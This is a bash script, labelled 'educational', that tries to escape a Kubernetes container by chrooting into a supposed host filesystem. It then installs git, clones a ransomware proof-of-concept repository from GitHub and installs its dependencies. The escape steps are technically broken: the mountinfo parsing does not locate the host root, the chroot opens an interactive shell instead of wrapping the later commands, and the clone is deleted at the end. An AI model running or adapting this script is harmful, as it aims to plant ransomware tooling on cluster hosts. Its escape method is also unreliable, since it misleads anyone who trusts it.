#!/bin/bash

# This script is intended for educational purposes only.
# It demonstrates a container escape attempt within a Kubernetes cluster to install a repository.

# Escalate to the host filesystem
# Attempt to find the root mount and chroot into it
HOST_FS=$(grep ' / ' /proc/self/mountinfo | awk '{print $4}')
if [ -z "$HOST_FS" ]; then
    echo "Failed to locate host filesystem. Aborting escape attempt."
    exit 1
fi

# Move into the host filesystem
cd $HOST_FS || exit 1

# Gain root-level privileges
if ! chroot $HOST_FS /bin/bash; then
    echo "Failed to change root to host filesystem. Escape attempt failed."
    exit 1
fi

# Install git if not already installed on the host
if ! command -v git &> /dev/null; then
    apt-get update && apt-get install -y git
fi

# Move to a temporary directory and clone the Ransomware-PoC repository
mkdir -p /tmp/ransomware_install
cd /tmp/ransomware_install || exit 1

# Clone the GitHub repository
if git clone https://github.com/jimmy-ly00/Ransomware-PoC.git; then
    echo "Successfully cloned Ransomware-PoC repository."
else
    echo "Failed to clone repository."
    exit 1
fi

# Change to the cloned directory and install dependencies
cd Ransomware-PoC || exit 1

if [ -f "requirements.txt" ]; then
    pip install --no-cache-dir -r requirements.txt
    echo "Dependencies installed successfully."
else
    echo "No requirements.txt found. Skipping dependency installation."
fi

# Clean up
cd /
rm -rf /tmp/ransomware_install

# End of script
exit 0
